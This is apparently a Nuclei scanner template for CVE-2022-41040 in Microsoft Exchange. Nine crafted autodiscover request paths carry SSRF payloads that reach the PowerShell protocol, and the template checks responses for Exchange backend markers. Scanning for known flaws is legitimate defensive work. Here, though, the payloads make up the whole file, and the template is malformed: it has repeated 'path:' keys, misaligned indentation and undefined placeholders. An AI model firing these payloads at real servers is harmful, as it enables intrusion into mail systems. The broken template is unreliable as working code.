id: owa-scanner-exploit

info:
  name: CVE-2022-41040 Nuclei Scanner
  author: twitter.com/dethlocker
  severity: info
  tags: CVE-2022-41040

requests:
  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL"
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@%d.v2.@URL?Protocol=Autodiscoverv1"
      path:
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa..@%d.v3.@URL/owa/?&Email=autodiscover/autodiscover.json?a..@%d.v3.@URL&Protocol=Autodiscoverv1&Protocol=Powershell"
      path:
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@%d.v4.@URL/owa/?&Email=autodiscover/autodiscover.json?a@%d.v4.@URL&Protocol=Autodiscoverv1&Protocol=Powershell"
      path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa..%d.v5.@URL/owa/?&Email=autodiscover/autodiscover.json?a..%d.v5.@URL&Protocol=Autodiscoverv1&%d.v5.@URLProtocol=Powershell"
      path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa@%d.v6.@URL/owa/?&Email=autodiscover/autodiscover.json?a@%d.v6.@URL&Protocol=Autodiscoverv1&%d.v6.@URLProtocol=Powershell"
      path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa..%d.v7.@URL/owa/?&Email=aa@autodiscover/autodiscover.json?a..%d.v7.@URL&Protocol=Autodiscoverv1&%d.v7.@URLProtocol=Powershell"
      path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa@%d.v8.@URL/owa/?&Email=aa@autodiscover/autodiscover.json?a@%d.v8.@URL&Protocol=Autodiscoverv1&%d.v8.@URLProtocol=Powershell"
      path:
      - "{{BaseURL}}/autodiscover//autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@%d.v9.@URL&Protocol=Autodiscoverv1&Protocol=Powershell"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "IIS Web Core"
        part: body
        condition: and

      - type: word
        words:
          - "X-BackEndCookie"
        part: header
        condition: and
